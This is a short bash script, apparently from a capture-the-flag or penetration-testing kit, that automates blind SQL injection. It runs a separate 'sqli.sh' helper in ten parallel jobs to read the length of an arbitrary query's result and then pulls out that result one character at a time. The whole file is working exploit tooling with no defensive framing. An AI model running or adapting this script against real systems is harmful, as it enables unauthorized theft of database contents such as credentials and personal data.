#!/bin/bash

dir=$(dirname $0)

make_request() {
  SQL=$1
  MAX=$2

  # get data
  tmp=$(mktemp)
  seq 1 $MAX | xargs -P 10 -I {} $dir/sqli.sh "($SQL)" {} | tee -a $tmp 1>/dev/null
  data=$(sort -n $tmp | awk '{printf "%s", $2}')

  rm -f $tmp
  echo -n $data
}

SQL=$1

length=$(make_request "SELECT+LENGTH(($SQL))" 2)
echo LENGTH = $length

data=$(make_request "$SQL" $length)
echo DATA = $data
